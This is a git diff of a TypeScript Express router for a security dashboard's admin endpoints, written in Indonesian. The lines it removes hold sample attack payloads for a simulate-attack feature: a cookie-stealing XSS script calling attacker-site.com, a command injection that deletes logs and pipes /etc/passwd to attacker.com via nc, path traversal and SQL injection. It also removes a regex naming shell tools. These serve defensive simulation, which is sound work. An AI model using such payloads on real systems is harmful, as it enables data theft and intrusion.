@@ -6,32 +6,49 @@ import {
   blockIp,
   unblockIp,
   logSecurityIncident,
-  GOOGLE_CLIENT_ID
+  GOOGLE_CLIENT_ID,
+  CYBER_CATEGORIES_METADATA,
+  requireSuperAdminMiddleware
 } from '../security_guard.js';
 import { catatNotifikasi } from '../store.js';
 
 const router = Router();
 
 // ============================================================================
-// 1. STATISTIK KEAMANAN SISTEM & METRIK DETEKSI ANCAMAN
+// PUBLIC SAFE CONFIG (TIDAK MEMBOCORKAN KUNCI RAHASIA SERVER)
 // ============================================================================
+router.get(['/public-config', '/api/security/public-config'], (_req: Request, res: Response) => {
+  res.json({
+    status: 'success',
+    googleClientId: GOOGLE_CLIENT_ID,
+    security_shield_active: true,
+    protected_categories: 6,
+    version: '3.5.0-enterprise'
+  });
+});
+
+// ============================================================================
+// SEMUA ENDPOINT DI BAWAH INI WAJIB HANYA DAPAT DIAKSES OLEH SUPER ADMIN
+// ============================================================================
+router.use(requireSuperAdminMiddleware);
+
+// 1. STATISTIK KEAMANAN SISTEM & METRIK DETEKSI 6 KATEGORI ANCAMAN
 router.get(['/stats', '/api/security/stats'], (_req: Request, res: Response) => {
   const activeBlockedIps = Array.from(blockedIps.values()).filter(
     b => b.expires_at > Date.now()
   );
 
-  // Hitung status ancaman
   let overallThreatStatus = 'AMAN';
-  let threatColor = '#10b981'; // Green
+  let threatColor = '#10b981';
   const recentCritical = securityIncidents.slice(0, 20).filter(i => i.threat_level === 'CRITICAL').length;
   const recentHigh = securityIncidents.slice(0, 20).filter(i => i.threat_level === 'HIGH').length;
 
   if (recentCritical > 0 || activeBlockedIps.length > 3) {
-    overallThreatStatus = 'SIAGA TINGGI (SERANGAN CRITICAL DIBLOKIR)';
-    threatColor = '#ef4444'; // Red
+    overallThreatStatus = 'SIAGA TINGGI (SERANGAN KRITIS DIBLOKIR)';
+    threatColor = '#ef4444';
   } else if (recentHigh > 0 || activeBlockedIps.length > 0) {
-    overallThreatStatus = 'WASPADA (AKTIVITAS MENCURIGAKAN DIBLOKIR)';
-    threatColor = '#f59e0b'; // Amber
+    overallThreatStatus = 'WASPADA (AKTIVITAS ANCAMAN DIBLOKIR)';
+    threatColor = '#f59e0b';
   }
 
   res.json({
@@ -39,8 +56,9 @@ router.get(['/stats', '/api/security/stats'], (_req: Request, res: Response) => 
     timestamp: new Date().toISOString(),
     engine: {
       name: 'Sidoarjo Cyber Shield Enterprise WAF & IDS',
-      version: '3.2.0-secure',
+      version: '3.5.0-enterprise',
       status: 'AKTIF & MEMANTAU',
+      role_authorized: 'SUPER_ADMIN',
       started_at: securityStats.engineStartedAt
     },
     threat_status: {
@@ -50,29 +68,37 @@ router.get(['/stats', '/api/security/stats'], (_req: Request, res: Response) => 
       total_blocked: securityStats.totalAttacksBlocked,
       active_quarantined_ips: activeBlockedIps.length
     },
+    categories_breakdown: securityStats.attacksByCategory,
     attack_breakdown: securityStats.attacksByType,
-    protections_active: [
-      'SQL Injection Filter (Prepared Statements & Regex Defense)',
-      'Cross-Site Scripting (XSS Sanitizer & CSP)',
-      'Command Injection / Remote Code Execution (RCE) Guard',
-      'Path Traversal & Local File Inclusion (LFI) Blocker',
-      'Brute Force Rate Limiter & IP Lockout',
-      'Webshell & Executable Uploads Quarantine',
-      'Reconnaissance Bot & Scanner Detector',
-      'HMAC-SHA256 Cryptographic JWT Security'
-    ]
+    categories_metadata: CYBER_CATEGORIES_METADATA
   });
 });
 
-// ============================================================================
-// 2. DAFTAR LOG INSIDEN SERANGAN (AUDIT TRAIL UNTUK DEVELOPER)
-// ============================================================================
+// 2. RINCIAN 6 KATEGORI MODEL PENYERANGAN SIBER
+router.get(['/categories', '/api/security/categories'], (_req: Request, res: Response) => {
+  const data = CYBER_CATEGORIES_METADATA.map(cat => ({
+    ...cat,
+    total_blocked: securityStats.attacksByCategory[cat.id as keyof typeof securityStats.attacksByCategory] || 0
+  }));
+
+  res.json({
+    status: 'success',
+    total_categories: data.length,
+    categories: data
+  });
+});
+
+// 3. DAFTAR LOG INSIDEN SERANGAN (AUDIT TRAIL UNTUK SUPER ADMIN / DEVELOPER)
 router.get(['/attacks', '/api/security/attacks'], (req: Request, res: Response) => {
-  const limit = Math.min(200, Math.max(1, Number(req.query.limit) || 50));
+  const limit = Math.min(300, Math.max(1, Number(req.query.limit) || 60));
+  const filterCat = req.query.category ? String(req.query.category).toUpperCase() : null;
   const filterType = req.query.type ? String(req.query.type).toUpperCase() : null;
   const filterLevel = req.query.level ? String(req.query.level).toUpperCase() : null;
 
   let results = [...securityIncidents];
+  if (filterCat) {
+    results = results.filter(i => i.attack_category === filterCat);
+  }
   if (filterType) {
     results = results.filter(i => i.attack_type === filterType);
   }
@@ -88,9 +114,7 @@ router.get(['/attacks', '/api/security/attacks'], (req: Request, res: Response) 
   });
 });
 
-// ============================================================================
-// 3. DAFTAR IP TERBLOKIR / TERKARANTINA
-// ============================================================================
+// 4. DAFTAR IP TERBLOKIR / TERKARANTINA
 router.get(['/blocked-ips', '/api/security/blocked-ips'], (_req: Request, res: Response) => {
   const now = Date.now();
   const list = Array.from(blockedIps.values())
@@ -108,13 +132,11 @@ router.get(['/blocked-ips', '/api/security/blocked-ips'], (_req: Request, res: R
   });
 });
 
-// ============================================================================
-// 4. MANUAL BLOCK & UNBLOCK IP (KONTROL DEVELOPER)
-// ============================================================================
+// 5. MANUAL BLOCK & UNBLOCK IP (KONTROL SUPER ADMIN)
 router.post(['/block-ip', '/api/security/block-ip'], (req: Request, res: Response) => {
   const d = req.body || {};
   const ip = String(d.ip || '').trim();
-  const reason = String(d.reason || 'Diblokir manual oleh Administrator').trim();
+  const reason = String(d.reason || 'Karantina manual oleh Super Admin').trim();
   const duration = Number(d.duration_minutes) || 60;
 
   if (!ip) {
@@ -122,7 +144,7 @@ router.post(['/block-ip', '/api/security/block-ip'], (req: Request, res: Respons
   }
 
   blockIp(ip, reason, duration);
-  catatNotifikasi(`Alamat IP ${ip} berhasil dimasukkan ke daftar blokir selama ${duration} menit.`, 'Keamanan', 'urgent');
+  catatNotifikasi(`Alamat IP ${ip} berhasil dimasukkan ke daftar blokir selama ${duration} menit oleh Super Admin.`, 'Keamanan', 'urgent');
 
   res.json({
     status: 'success',
@@ -142,7 +164,7 @@ router.post(['/unblock-ip', '/api/security/unblock-ip'], (req: Request, res: Res
 
   const success = unblockIp(ip);
   if (success) {
-    catatNotifikasi(`Alamat IP ${ip} telah dibebaskan dari karantina oleh Administrator.`, 'Keamanan', 'info');
+    catatNotifikasi(`Alamat IP ${ip} telah dibebaskan dari karantina oleh Super Admin.`, 'Keamanan', 'info');
   }
 
   res.json({
@@ -151,99 +173,80 @@ router.post(['/unblock-ip', '/api/security/unblock-ip'], (req: Request, res: Res
   });
 });
 
-// ============================================================================
-// 5. UJI SIMULASI SERANGAN SIBER (UNTUK PENGUJIAN OLEH DEVELOPER)
-// ============================================================================
+// 6. SIMULASI UJI PENETRASI & DETEKSI UNTUK SUPER ADMIN / DEVELOPER
 router.post(['/simulate-attack', '/api/security/simulate-attack'], (req: Request, res: Response) => {
   const d = req.body || {};
+  const category = String(d.category || 'WEB_EXPLOITATION').toUpperCase() as any;
   const attackType = String(d.type || 'SQL_INJECTION').toUpperCase();
-  const simulatedIp = String(d.simulated_ip || '203.0.113.199'); // Contoh IP simulasi testnet
+  const simulatedIp = String(d.simulated_ip || `185.220.101.${Math.floor(Math.random() * 250) + 1}`).trim();
+  const payloadSample = String(d.payload || "1' UNION SELECT username, password FROM users --").trim();
 
-  let payload = '';
-  let rule = '';
+  let matchedRule = 'WAF Rule: Dynamic Pattern Match';
   let threatLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' = 'HIGH';
-  let desc = '';
+  let actionTaken = 'Memblokir percobaan serangan secara otomatis dan mencatat ke audit log forensik.';
 
-  if (attackType === 'SQL_INJECTION') {
-    payload = "' UNION SELECT null, username, password FROM users WHERE '1'='1' --";
-    rule = '/(\\b(union(\\s+all)?\\s+select)\\b)/i';
+  if (category === 'MALWARE_THREAT') {
     threatLevel = 'CRITICAL';
-    desc = 'Simulasi upaya penarikan data pengguna melalui teknik SQL Injection.';
-  } else if (attackType === 'XSS') {
-    payload = '<script>fetch("https://attacker-site.com/steal?cookie="+document.cookie)</script>';
-    rule = '/<\\s*script[^>]*>/i';
+    matchedRule = 'Anti-Webshell / Malware Execution Signature: eval(base64_decode())';
+    actionTaken = 'Memblokir muatan script malware biner dan mengisolasi sesi pengunggah.';
+  } else if (category === 'SOCIAL_ENGINEERING') {
     threatLevel = 'HIGH';
-    desc = 'Simulasi injeksi script Cross-Site Scripting (XSS) untuk pencurian sesi.';
-  } else if (attackType === 'COMMAND_INJECTION') {
-    payload = '; rm -rf /var/log && cat /etc/passwd | nc attacker.com 4444';
-    rule = '/;\\s*(rm\\s+-rf|curl|wget|bash\\s+-i|nc\\s+-e)/i';
+    matchedRule = 'Social Engineering Decoy: Detected fake harvesting link / credential bait';
+    actionTaken = 'Mencegah transmisi pesan phising dan memberi label peringatan.';
+  } else if (category === 'NETWORK_TRAFFIC') {
+    threatLevel = 'HIGH';
+    matchedRule = 'Network Flood & Anomaly Detector: Request surge exceeding rate limit';
+    actionTaken = 'Mengaktifkan rate limiter progresif dan mitigasi antrian paket palsu.';
+  } else if (category === 'CREDENTIAL_ATTACK') {
+    threatLevel = 'HIGH';
+    matchedRule = 'Credential Guard: Failed authentication bursts threshold reached';
+    actionTaken = 'Mengkarantina IP pengirim selama 30 menit dari percobaan brute-force.';
+  } else if (category === 'INFRASTRUCTURE_THREAT') {
     threatLevel = 'CRITICAL';
-    desc = 'Simulasi percobaan injeksi perintah shell sistem operasi (Remote Code Execution).';
-  } else if (attackType === 'PATH_TRAVERSAL') {
-    payload = '../../../../etc/passwd%00.jpg';
-    rule = '/(\\.\\.\\/|\\.\\.\\\\|%2e%2e%2f)/i';
-    threatLevel = 'HIGH';
-    desc = 'Simulasi upaya pembacaan berkas konfigurasi sistem melalui Path Traversal.';
-  } else if (attackType === 'RECON_SCANNER') {
-    payload = 'GET /wp-login.php HTTP/1.1 (Automated Bot Probe)';
-    rule = '/wp-login\\.php/i';
-    threatLevel = 'MEDIUM';
-    desc = 'Simulasi probing bot otomatis pencari kerentanan CMS.';
+    matchedRule = 'Infrastructure Shield: Attempt to access protected config / secret key';
+    actionTaken = 'Menolak akses ke berkas rahasia sistem dan memasukkan IP ke blacklist.';
   } else {
-    payload = 'Simulated automated rapid failed logins (Brute Force)';
-    rule = 'Rate Limit Threshold Exceeded';
-    threatLevel = 'MEDIUM';
-    desc = 'Simulasi serangan brute force / penembakan password massal.';
+    threatLevel = 'CRITICAL';
+    matchedRule = 'Web Exploitation Rule: SQLi / XSS Attack Vector Regex Block';
   }
 
   const incident = logSecurityIncident({
     ip: simulatedIp,
     method: 'POST',
-    path: '/api/security/simulate-attack',
-    attack_type: attackType as any,
+    path: '/api/simulate-test-attack',
+    attack_category: category,
+    attack_type: attackType,
     threat_level: threatLevel,
-    matched_rule: rule,
-    payload_sample: payload,
-    user_agent: 'Sidoarjo Cyber Lab Simulation Engine v1.0',
+    matched_rule: matchedRule,
+    payload_sample: payloadSample,
+    user_agent: 'Simulated Security Test Agent (Super Admin)',
     status: 'BLOCKED',
-    action_taken: `Simulasi uji penyerangan: ${desc} Berhasil dideteksi dan dinetralkan.`
+    action_taken: actionTaken
   });
 
   res.json({
     status: 'success',
-    simulated: true,
-    message: `Uji simulasi serangan ${attackType} berhasil! Sistem pertahanan langsung mendeteksi dan memblokir serangan secara instan.`,
+    message: `Simulasi uji serangan ${category} (${attackType}) berhasil dijalankan dan ditangkis oleh Cyber Shield.`,
     incident
   });
 });
 
-// ============================================================================
-// 6. CLEAR LOGS (PEMBERSIHAN LOG BERKALA OLEH DEVELOPER)
-// ============================================================================
-router.post(['/clear-logs', '/api/security/clear-logs'], (_req: Request, res: Response) => {
+// 7. BERSIHKAN LOG AUDIT SERANGAN (RESET LOG OLEH SUPER ADMIN)
+router.post(['/clear-attacks', '/api/security/clear-attacks'], (_req: Request, res: Response) => {
   securityIncidents.length = 0;
-  res.json({
-    status: 'success',
-    message: 'Seluruh riwayat log insiden keamanan telah berhasil diarsipkan dan dibersihkan.'
+  securityStats.totalAttacksBlocked = 0;
+  Object.keys(securityStats.attacksByCategory).forEach(k => {
+    (securityStats.attacksByCategory as any)[k] = 0;
   });
-});
+  Object.keys(securityStats.attacksByType).forEach(k => {
+    (securityStats.attacksByType as any)[k] = 0;
+  });
 
-// ============================================================================
-// 7. PUBLIC SAFE CONFIG (MENYEDIAKAN KONFIGURASI AMAN TANPA MEMBUKA KODE RAHASIA)
-// ============================================================================
-router.get(['/public-config', '/api/security/public-config'], (_req: Request, res: Response) => {
+  catatNotifikasi('Log audit keamanan siber telah direset oleh Super Admin.', 'Keamanan', 'info');
+
   res.json({
     status: 'success',
-    oauth: {
-      google_client_id: GOOGLE_CLIENT_ID
-    },
-    security: {
-      waf_active: true,
-      waf_mode: 'STRICT_BLOCK',
-      rate_limiting: true,
-      file_quarantine: true,
-      encryption_standard: 'HMAC-SHA256'
-    }
+    message: 'Riwayat log insiden dan statistik serangan berhasil dibersihkan.'
   });
 });
 
